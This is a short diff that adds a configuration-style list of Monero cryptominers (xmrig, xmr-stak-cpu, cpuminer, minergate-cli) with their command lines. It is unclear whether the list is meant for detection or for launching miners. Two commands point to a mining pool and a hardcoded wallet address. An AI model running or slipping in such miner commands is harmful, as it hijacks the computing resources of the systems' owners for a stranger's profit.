@@ -1,1 +1,19 @@
+name: 
+  xmrig
+command: 
+  ./xmrig-2.14.1/xmrig  -a cryptonight -o stratum+tcp://pool.minexmr.com:4444 -u 44VAwEd4tTAU2V1n2snMo5d1vD3wXBY6scUGWGrqJSRsFt46SR33MscZRNLB9TErKg4mVvjSe1FPLQE4pJLqRegG8CJWsTA -p x
 
+name:
+  xmr-stak-cpu
+command:
+  xmr-stak-cpu ./config.txt
+  
+name:
+  cpuminer
+command:
+  ./minerd
+  
+name:
+  minergate-cli
+command:
+  minergate-cli -user 44VAwEd4tTAU2V1n2snMo5d1vD3wXBY6scUGWGrqJSRsFt46SR33MscZRNLB9TErKg4mVvjSe1FPLQE4pJLqRegG8CJWsTA -xmr
